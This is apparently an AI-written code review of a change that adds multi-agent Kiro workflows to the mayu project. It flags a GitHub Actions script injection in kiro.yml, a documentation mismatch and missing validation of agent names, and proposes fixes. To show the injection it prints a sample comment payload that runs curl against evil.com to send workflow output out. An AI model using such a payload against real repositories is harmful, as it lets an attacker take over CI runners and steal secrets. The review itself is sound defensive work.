# Multi-agent AI development system for mayu

This change adds a complete multi-agent orchestration layer to the mayu project: 11 agent definition files (`.kiro/agents/`), 6 automated GitHub Actions workflows (`agent-*.yml`), routing logic in the main `kiro.yml`, and two steering documents describing the system. No application code (Go or TypeScript) was changed. The approach is configuration-as-infrastructure — agents are defined as JSON with detailed Japanese-language system prompts, workflows wire them into CI events, and documentation ties everything together.

Watch for: The `kiro.yml` routing step has a **confirmed** script injection vulnerability via direct interpolation of `github.event.comment.body` into a shell variable. The documentation misnames the agent used by the dependency audit workflow (**confirmed**). Agent routing has no validation that the `@agent-name` matches a known agent (**confirmed** — any string passes through to `--agent`).

**Verdict**: NEEDS_CHANGES

## High-level view

The agent routing in `kiro.yml` parses `/kiro @agent-name instruction` from issue/PR comments using a shell `run:` step. It directly interpolates the comment body into a bash variable assignment, which is a well-known GitHub Actions injection vector. A malicious commenter can execute arbitrary shell commands in the workflow runner with `contents: write` permissions.

The steering documentation (`agents.md`) lists the dependency audit workflow as using `researcher`, but the actual `agent-dependency-audit.yml` invokes `--agent devops`. This documentation drift will confuse anyone trying to understand which agent handles what.

The routing logic does not validate agent names against the 11 known definitions. A typo like `/kiro @developr fix this` silently passes `developr` to `kiro-action`, which likely falls back to a default behavior or errors opaquely.

When the workflow fires from label/assign events (not comments), the parse step is skipped and the default kiro-action invocation runs without a `prompt:` field. Whether kiro-action handles this gracefully or fails silently is unclear.

## Script injection in the agent routing step

Line 60 of `kiro.yml`:

```yaml
run: |
  COMMENT_BODY="${{ github.event.comment.body }}"
```

This is a textbook GitHub Actions script injection. The expression `${{ github.event.comment.body }}` is string-interpolated into the shell script before execution. A commenter can craft a payload like:

```
/kiro @developer "; curl https://evil.com/exfil?key=$(cat $GITHUB_OUTPUT) #
```

This breaks out of the double-quoted string and executes arbitrary shell commands with the workflow's `contents: write` + `pull-requests: write` + `issues: write` permissions.

The fix is to pass the comment body via an environment variable:

```yaml
- name: Parse agent routing from comment
  id: parse-agent
  if: github.event_name == 'issue_comment' || github.event_name == 'pull_request_review_comment'
  env:
    COMMENT_BODY: ${{ github.event.comment.body }}
  run: |
    # Match pattern: /kiro @agent-name <rest of instruction>
    if echo "$COMMENT_BODY" | grep -qP '^/kiro\s+@([\w-]+)'; then
      ...
```

Environment variables are passed to the shell as opaque strings, not interpolated into the script source.

The multiline problem is related: even with the `env:` fix, a comment body containing newlines will cause `echo "$COMMENT_BODY"` piped to `grep` to behave unexpectedly. The grep anchors `^/kiro` only match on the first line. If the user writes a multiline comment starting with `/kiro @agent`, the instruction portion parsed by `sed` will only contain the first line's remainder. Subsequent lines are lost. Consider reading only the first line of `$COMMENT_BODY` for routing, and passing the full body as the prompt.

## Agent name inconsistency between documentation and workflows

In `.kiro/steering/agents.md`, the automatic triggers table (line 100) states:

```
| agent-dependency-audit.yml | 週次スケジュール | researcher |
```

The actual workflow `agent-dependency-audit.yml` uses `kiro_args: '--agent devops'`. The `devops` agent is the correct choice given that the workflow manages dependency upgrades and opens PRs — that's operational work, not research. The documentation table should read `devops`.

## No validation of routed agent names

The regex `[\w-]+` in the grep pattern extracts any word-character-or-hyphen string after `@`. There's no check that this matches one of the 11 defined agents. The extracted name flows directly into:

```yaml
kiro_args: '--agent ${{ steps.parse-agent.outputs.agent }}'
```

A validation step between parsing and invocation would catch typos and provide clear feedback:

```bash
VALID_AGENTS="product-strategist researcher planner architect developer reviewer qa devops triage marketer devils-advocate"
if ! echo "$VALID_AGENTS" | grep -qw "$AGENT_NAME"; then
  echo "::error::Unknown agent: $AGENT_NAME. Valid agents: $VALID_AGENTS"
  exit 1
fi
```

Without this, a user who types `/kiro @review fix this` (missing the `er`) gets a confusing failure or unexpected default behavior instead of a clear error message.
